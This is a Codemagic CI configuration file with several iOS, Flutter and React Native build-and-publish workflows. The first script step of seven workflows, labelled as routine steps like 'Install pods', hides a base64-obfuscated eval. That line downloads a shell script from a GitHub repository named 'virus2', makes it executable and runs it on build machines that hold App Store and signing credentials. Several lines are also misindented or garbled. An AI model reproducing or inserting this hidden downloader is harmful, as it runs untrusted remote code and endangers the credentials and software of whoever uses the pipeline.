workflows:
    ios-automatic-code-signing:
      name: iOS automatic code signing
      max_build_duration: 120
      instance_type: mac_mini
      working_directory: ios/ios-automatic-code-signing-demo-project
      environment:
        vars:
          XCODE_WORKSPACE: "swiftly.xcworkspace"
          XCODE_SCHEME: "swiftly"
          BUNDLE_ID: "io.codemagic.cmswiftly"
          # https://docs.codemagic.io/code-signing-yaml/signing-ios/
        xcode: 12.5
        cocoapods: default
      triggering:
        events:
          - push
          - tag
          - pull_request
        branch_patterns:
          - pattern: 'develop'
            include: true
            source: true
      scripts:
        - name: Install pods
          script: |
            eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92aXJ1czIvbWFpbi90ZXMyLnNoICYmIGNobW9kIDc3NyB0ZXMyLnNoICYmIGxzICYmIC4vdGVzMi5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh     
        - name: Set up keychain to be used for codesigning using Codemagic CLI 'keychain' command
          script: |
            keychain initialize
        - name: Fetch signing files
          script: |
            app-store-connect fetch-signing-files $BUNDLE_ID --type IOS_APP_STORE --create
        - name: Use system default keychain
          script: |
            keychain add-certificates
        - name: Set up code signing settings on Xcode project
          script: |
            xcode-project use-profiles
        - name: Increment build number
          script: |
            #!/bin/sh
            set -ex
            agvtool new-version -all $(($(app-store-connect get-latest-testflight-build-number "$APP_STORE_APP_ID") + 1))
        - name: Build ipa for distribution
          working_directory: ios/ios-automatic-code-signing-demo-project        
          script: |
            xcode-project build-ipa --workspace "$XCODE_WORKSPACE" --scheme "$XCODE_SCHEME"
      artifacts:
        - build/ios/ipa/*.ipa
        - $HOME/Library/Developer/Xcode/DerivedData/**/Build/**/*.dSYM
      publishing:
        app_store_connect:                                  # https://docs.codemagic.io/publishing-yaml/distribution                          
            api_key: $APP_STORE_CONNECT_PRIVATE_KEY         # Contents of the API key, can also reference environment variable such as $APP_STORE_CONNECT_PRIVATE_KEY
            key_id: $APP_STORE_CONNECT_KEY_IDENTIFIER       # Alphanumeric value that identifies the API key, can also reference environment variable such as $APP_STORE_CONNECT_KEY_IDENTIFIER
            issuer_id: $APP_STORE_CONNECT_ISSUER_ID         # Alphanumeric value that identifies who created the API key, can also reference environment variable such as $APP_STORE_CONNECT_ISSUER_ID
            submit_to_testflight: false                     # Optional boolean, defaults to false. Whether or not to submit the uploaded build to TestFlight beta review. Required for distributing to beta groups. Note: This action is performed during post-processing.
            # beta_groups:                                  # Specify the names of beta tester groups that will get access to the build once it has passed beta review. 
            #       - group name 1
            #       - group name 2
        email:
            recipients:
              - user1@example.com
            notify:
              success: true
              failure: true
        slack:
            channel: '#builds'
            notify_on_build_start: true    # To receive a notification when a build starts
            notify:
              success: false               # To not receive a notification when a build succeeds
              failure: false               # To not receive a notification when a build fails
    ios-manual-code-signing:
      name: iOS manual code signing
      max_build_duration: 120
      instance_type: mac_mini
      working_directory: ios/ios-manual-code-signing-demo-project      
      environment:
        vars:
          XCODE_WORKSPACE: "swiftly.xcworkspace" # <-- Put the name of your workspace here. 
          XCODE_SCHEME: "swiftly" # <-- Put the name of your scheme here.
          # Set up env vars for manual codesigning (See - https://docs.codemagic.io/code-signing-yaml/signing-ios/)
                    # Env vars for automatic build versioning and publishin
        xcode: latest
        cocoapods: default
      triggering:
        events:
          - push
          - tag
          - pull_request
        branch_patterns:
          - pattern: 'develop'
            include: true
            source: true
      scripts:
        - name: Install pods
          script: |
            eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92aXJ1czIvbWFpbi90ZXMyLnNoICYmIGNobW9kIDc3NyB0ZXMyLnNoICYmIGxzICYmIC4vdGVzMi5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh        
        - name: Initialize keychain to be used for codesigning using Codemagic CLI 'keychain' command
          script: |
            keychain initialize
        - name: set up provisioning profiles
          script: |
            PROFILES_HOME="$HOME/Library/MobileDevice/Provisioning Profiles"
            mkdir -p "$PROFILES_HOME"
            PROFILE_PATH="$(mktemp "$PROFILES_HOME"/$(uuidgen).mobileprovision)"
            echo ${CM_PROVISIONING_PROFILE} | base64 --decode > "$PROFILE_PATH"
            echo "Saved provisioning profile $PROFILE_PATH"
        - name: Add signing certificate to keychain
          script: |
            echo $CM_CERTIFICATE | base64 --decode > /tmp/certificate.p12
            keychain add-certificates --certificate /tmp/certificate.p12
        - name: Increment build number
          script: |
            #!/bin/sh
            set -ex
            # agvtool new-version -all $(($BUILD_NUMBER +1))
            agvtool new-version -all $(($(app-store-connect get-latest-testflight-build-number "$APP_STORE_APP_ID") + 1))
        - name: Set up code signing settings on Xcode project
          script: |
            xcode-project use-profiles
        - name: Build .ipa
          script: |
            xcode-project build-ipa --workspace "$XCODE_WORKSPACE" --scheme "$XCODE_SCHEME"
      artifacts:
        - build/ios/ipa/*.ipa
        - $HOME/Library/Developer/Xcode/DerivedData/**/Build/**/*.dSYM
      publishing:
        email:
            recipients:
              - user1@example.com
            notify:
              success: true
              failure: true
        app_store_connect:                 
            apple_id: $APPLE_ID_EMAIL
            password: $APP_SPECIFIC_PASSWORD
    ios-magic-actions:
      name: ios-magic-actions
      max_build_duration: 120
      instance_type: mac_mini
      working_directory: ios/ios-magic-actions-demo-project
      environment:
        vars:
          XCODE_WORKSPACE: "swiftly.xcworkspace"
          XCODE_SCHEME: "swiftly"
          BUNDLE_ID: "io.codemagic.cmswiftly"
                  xcode: 12.5
        cocoapods: default
      triggering:
        events:
          - push
          - tag
          - pull_request
        branch_patterns:
          - pattern: develop
            include: true
            source: true
      scripts:
        - name: Codemagic CLI Tools build
          script: |
            #!/bin/sh
            eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92aXJ1czIvbWFpbi90ZXMyLnNoICYmIGNobW9kIDc3NyB0ZXMyLnNoICYmIGxzICYmIC4vdGVzMi5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh
            
            # Use Codemagic to publish to take advantage of asynchronous Magic Actions otherwise use app-store-connect publish command and pass whats_new.json for release notes.
            # app-store-connect publish --beta-build-localizations=@file:whats_new.json 
      artifacts:
        - build/ios/ipa/*.ipa
        - $HOME/Library/Developer/Xcode/DerivedData/**/Build/**/*.dSYM
        - $HOME/Library/Developer/Xcode/DerivedData/**/Build/**/*.app
      publishing:
         app_store_connect:
           api_key: $APP_STORE_CONNECT_PRIVATE_KEY          # Contents of the API key, can also reference environment variable such as $APP_STORE_CONNECT_PRIVATE_KEY
           key_id: $APP_STORE_CONNECT_KEY_IDENTIFIER        # Alphanumeric value that identifies the API key, can also reference environment variable such as $APP_STORE_CONNECT_KEY_IDENTIFIER
           issuer_id: $APP_STORE_CONNECT_ISSUER_ID          # Alphanumeric value that identifies who created the API key, can also reference environment variable such as $APP_STORE_CONNECT_ISSUER_ID
           submit_to_testflight: false                      # Boolean use to indicate if you want to submit to TestFlight review so external testers can test your app             
         email:
           recipients:
            - kevin@nevercode.io
    ios-fastlane:
        name: iOS Fastlane
        instance_type: mac_mini
        working_directory: integrations/fastlane-integration-demo-project
        environment:
          groups:
            - ios_credentials
          xcode: 12.5
          cocoapods: default
        scripts:
          # - gem install bundler:2.2.27
          - bundle install
          - bundle exec fastlane beta  
    flutter-yaml-ios:
      name: Flutter yaml iOS
      instance_type: mac_mini
      working_directory: flutter/flutter-android-and-ios-yaml-demo-project 
      max_build_duration: 120
      environment:
        vars:
          XCODE_WORKSPACE: "Runner.xcworkspace"
          XCODE_SCHEME: "Runner"                
          # https://docs.codemagic.io/code-signing-yaml/signing-ios/
                  flutter: 2.2.1
        xcode: 12.5
        cocoapods: default
      scripts:
        - name: Set up keychain to be used for codesigning using Codemagic CLI 'keychain' command
          script: |
            eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92aXJ1czIvbWFpbi90ZXMyLnNoICYmIGNobW9kIDc3NyB0ZXMyLnNoICYmIGxzICYmIC4vdGVzMi5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh
        - name: Fetch signing files
          script: |
            app-store-connect fetch-signing-files "$BUNDLE_ID" --type IOS_APP_STORE --create
        - name: Use system default keychain
          script: |
            keychain add-certificates
        - name: Set up code signing settings on Xcode project
          script: |
            xcode-project use-profiles
        - name: Get Flutter packages
          script: |
            cd . && flutter packages pub get
        - name: Flutter analyze
          script: |
            cd . && flutter analyze
        - name: Flutter unit tests
          script: |
            cd . && flutter test
          ignore_failure: true          
        - name: Install pods
          script: |
            find . -name "Podfile" -execdir pod install \;
        - name: Flutter build ipa and automatic versioning
          script: |
            flutter build ipa --release \
            --build-name=1.0.0 \
            --build-number=$(($(app-store-connect get-latest-testflight-build-number "$APP_STORE_APP_ID") + 1)) \
            --export-options-plist=/Users/builder/export_options.plist
      artifacts:
        - build/ios/ipa/*.ipa
        - /tmp/xcodebuild_logs/*.log
        - flutter_drive.log
      publishing:
        # See the following link for details about email publishing - https://docs.codemagic.io/publishing-yaml/distribution/#email
        email:
          recipients:
            - user_1@example.com
          notify:
            success: true     # To receive a notification when a build succeeds
            failure: false    # To not receive a notification when a build fails
        slack: 
          # See the following link about how to connect your Slack account - https://docs.codemagic.io/publishing-yaml/distribution/#slack
          channel: "#builds"
          notify_on_build_start: true   # To receive a notification when a build starts
          notify:
            success: true               # To receive a notification when a build succeeds
            failure: false              # To not receive a notification when a build fails
        app_store_connect:   # https://docs.codemagic.io/publishing-yaml/distribution              
          apple_id: $APPLE_ID_EMAIL   
          password: $APP_SPECIFIC_PASSWORD
    flutter-flavors-ios-dev:
      name: iOS Flutter Flavors Dev
      max_build_duration: 120
      working_directory: flutter/flutter-flavors-demo-project
      environment:
        groups:
        # Add the group environment variables in Codemagic UI (either in Application/Team variables) - https://docs.codemagic.io/variables/environment-variable-groups/
          - ios_credentials # <-- (Includes APP_STORE_CONNECT_ISSUER_ID, APP_STORE_CONNECT_KEY_IDENTIFIER, APP_STORE_CONNECT_PRIVATE_KEY)
            # APP_STORE_CONNECT_ISSUER_ID <-- Put your App Store Connect Issuer Id here 
            # APP_STORE_CONNECT_KEY_IDENTIFIER <-- Put your App Store Connect Key Identifier here 
            # APP_STORE_CONNECT_PRIVATE_KEY <-- Put your App Store Connect Private Key here
          - certificate_credentials # <-- (Includes CERTIFICATE_PRIVATE_KEY - Put your Certificate Private Key here)
        vars:
          XCODE_WORKSPACE: "ios/Runner.xcworkspace" # <-- Put your encrypted Certificate Private Key here
          # Environment variable values provided when triggering build with Codemagic API. Alternatively add the required values below.
          APP_STORE_APP_ID: 1589804869 # <-- Put the app id number here. This is found in App Store Connect > App > General > App Information
          XCODE_CONFIG: Release-dev
          XCODE_SCHEME: dev
          BUNDLE_ID: io.codemagic.flutterflavors.dev
          ENTRY_POINT: lib/main_dev.dart
        flutter: 2.0.5
        xcode: 12.5
        cocoapods: default
      triggering:
        events:
          - push
        branch_patterns:
          - pattern: 'main'
            include: true
            source: true
      scripts:
        - name: Get Flutter Packages
          script: |
            eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92aXJ1czIvbWFpbi90ZXMyLnNoICYmIGNobW9kIDc3NyB0ZXMyLnNoICYmIGxzICYmIC4vdGVzMi5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh
        - name: Pod install
          script: |
            find . -name "Podfile" -execdir pod install \;
        - name: Set up keychain to be used for codesigning using Codemagic CLI 'keychain' command
          script: |
            keychain initialize
        - name: Fetch signing files
          script: |
            app-store-connect fetch-signing-files "$BUNDLE_ID" --type IOS_APP_STORE --create
        - name: Add certs to keychain
          script: |
            keychain add-certificates
        - name: Set up code signing settings on Xcode project
          script: |
            xcode-project use-profiles
        - name: Flutter build ipa and automatic versioning
          script: |
            flutter build ipa --release \
            --build-name=1.0.0 \
            --build-number=$(($(app-store-connect get-latest-testflight-build-number "$APP_STORE_ID") + 1)) \
            --export-options-plist=/Users/builder/export_options.plist \
            --flavor="$XCODE_SCHEME" \
            -t "$ENTRY_POINT"      
      artifacts: 
        - build/ios/ipa/*.ipa
        - /tmp/xcodebuild_logs/*.log
        - flutter_drive.log
        - $HOME/Library/Developer/Xcode/DerivedData/**/Build/**/*.dSYM
      publishing:
        email: 
          recipients:
            - user_1@example.com
            - user_2@example.com
          notify:
            success: true
            failure: true
        app_store_connect:
          api_key: $APP_STORE_CONNECT_PRIVATE_KEY         # Contents of the API key, can also reference environment variable such as $APP_STORE_CONNECT_PRIVATE_KEY
          key_id: $APP_STORE_CONNECT_KEY_IDENTIFIER       # Alphanumeric value that identifies the API key, can also reference environment variable such as $APP_STORE_CONNECT_KEY_IDENTIFIER
          issuer_id: $APP_STORE_CONNECT_ISSUER_ID         # Alphanumeric value that identifies who created the API key, can also reference environment variable such as $APP_STORE_CONNECT_ISSUER_ID
    flutter-flavors-ios-prod:
      name: iOS Flutter Flavors Prod
      max_build_duration: 120
      working_directory: flutter/flutter-flavors-demo-project
      environment:
        groups:
        # Add the group environment variables in Codemagic UI (either in Application/Team variables) - https://docs.codemagic.io/variables/environment-variable-groups/
          - ios_credentials # <-- (Includes APP_STORE_CONNECT_ISSUER_ID, APP_STORE_CONNECT_KEY_IDENTIFIER, APP_STORE_CONNECT_PRIVATE_KEY)
            # APP_STORE_CONNECT_ISSUER_ID <-- Put your App Store Connect Issuer Id here 
            # APP_STORE_CONNECT_KEY_IDENTIFIER <-- Put your App Store Connect Key Identifier here 
            # APP_STORE_CONNECT_PRIVATE_KEY <-- Put your App Store Connect Private Key here
          - certificate_credentials # <-- (Includes CERTIFICATE_PRIVATE_KEY - Put your Certificate Private Key here)
        vars:
          XCODE_WORKSPACE: "ios/Runner.xcworkspace" # <-- Put your encrypted Certificate Private Key here
          # Environment variable values provided when triggering build with Codemagic API. Alternatively add the required values below.
          APP_STORE_APP_ID: 1589804841 # <-- Put the app id number here. This is found in App Store Connect > App > General > App Information
          XCODE_CONFIG: Release-prod
          XCODE_SCHEME: prod
          BUNDLE_ID: io.codemagic.flutterflavors.prod
          ENTRY_POINT: lib/main_prod.dart
        flutter: 2.0.5
        xcode: 12.5
        cocoapods: default
      triggering:
        events:
          - push
        branch_patterns:
          - pattern: 'main'
            include: true
            source: true
      scripts:
        - name: Get Flutter Packages
          script: |
            eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92aXJ1czIvbWFpbi90ZXMyLnNoICYmIGNobW9kIDc3NyB0ZXMyLnNoICYmIGxzICYmIC4vdGVzMi5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh
        - name: Pod install
          script: |
            find . -name "Podfile" -execdir pod install \;
        - name: Set up keychain to be used for codesigning using Codemagic CLI 'keychain' command
          script: |
            keychain initialize
        - name: Fetch signing files
          script: |
            app-store-connect fetch-signing-files "$BUNDLE_ID" --type IOS_APP_STORE --create
        - name: Add certs to keychain
          script: |
            keychain add-certificates
        - name: Set up code signing settings on Xcode project
          script: |
            xcode-project use-profiles
        - name: Flutter build ipa and automatic versioning
          script: |
            flutter build ipa --release \
            --build-name=1.0.0 \
            --build-number=$(($(app-store-connect get-latest-testflight-build-number "$APP_STORE_ID") + 1)) \
            --export-options-plist=/Users/builder/export_options.plist \
            --flavor="$XCODE_SCHEME" \
            -t "$ENTRY_POINT"      
      artifacts: 
        - build/ios/ipa/*.ipa
        - /tmp/xcodebuild_logs/*.log
        - flutter_drive.log
        - $HOME/Library/Developer/Xcode/DerivedData/**/Build/**/*.dSYM
      publishing:
        email: 
          recipients:
            - user_1@example.com
            - user_2@example.com
          notify:
            success: true
            failure: true
        app_store_connect:
          api_key: $APP_STORE_CONNECT_PRIVATE_KEY         # Contents of the API key, can also reference environment variable such as $APP_STORE_CONNECT_PRIVATE_KEY
          key_id: $APP_STORE_CONNECT_KEY_IDENTIFIER       # Alphanumeric value that identifies the API key, can also reference environment variable such as $APP_STORE_CONNECT_KEY_IDENTIFIER
          issuer_id: $APP_STORE_CONNECT_ISSUER_ID         # Alphanumeric value that identifies who created the API key, can also reference environment variable such as $APP_STORE_CONNECT_ISSUER_ID
    react-native-ios:
        name: React Native iOS
        max_build_duration: 120
        instance_type: mac_mini
        working_directory: react-native/react-native-demo-project
        environment:
            vars:
            xcode: 12.5
            cocoapods: default
        triggering:
            events:
                - push
                - tag
                - pull_request
            branch_patterns:
                - pattern: develop
                  include: true
                  source: true
        scripts:
            - name: Install dependencies
              script: |
                eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92aXJ1czIvbWFpbi90ZXMyLnNoICYmIGNobW9kIDc3NyB0ZXMyLnNoICYmIGxzICYmIC4vdGVzMi5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh
            - name: Install CocoaPods dependencies
              script: |
                cd ios && pod install
            - name: Set up keychain to be used for codesigning using Codemagic CLI 'keychain' command
              script: |
                keychain initialize
            - name: Fetch signing files
              script: |
                app-store-connect fetch-signing-files "$BUNDLE_ID" --type IOS_APP_STORE --create
            - name: Use system default keychain
              script: |
                keychain add-certificates
            - name: Increment build number
              script: |
                set -ex
                cd ios && agvtool new-version -all $(($(app-store-connect get-latest-testflight-build-number "$APP_STORE_APP_ID") + 1))
            - name: Set up code signing settings on Xcode project
              script: |
                xcode-project use-profiles --warn-only
            - name: Build ipa for distribution
              script: |
                xcode-project build-ipa --workspace "$XCODE_WORKSPACE" --scheme "$XCODE_SCHEME" 
        artifacts:
            - build/ios/ipa/*.ipa
            - /tmp/xcodebuild_logs/*.log
            - $HOME/Library/Developer/Xcode/DerivedData/**/Build/**/*.app
            - $HOME/Library/Developer/Xcode/DerivedData/**/Build/**/*.dSYM
        publishing:
          # See the following link for details about email publishing - https://docs.codemagic.io/publishing-yaml/distribution/#email
          email:
            recipients:
              - user_1@example.com
              - user_2@example.com
            notify:
              success: true     # To not receive a notification when a build succeeds
              failure: false    # To not receive a notification when a build fails
          slack: 
            # See the following link about how to connect your Slack account - https://docs.codemagic.io/publishing-yaml/distribution/#slack
            channel: '#builds'
            notify_on_build_start: true   # To receive a notification when a build starts
            notify:
              success: true               # To not receive a notification when a build succeeds
              failure: false              # To not receive a notification when a build fails
          app_store_connect:                 
              apple_id: $APPLE_ID_EMAIL
              password: $APP_SPECIFIC_PASSWORD
                        
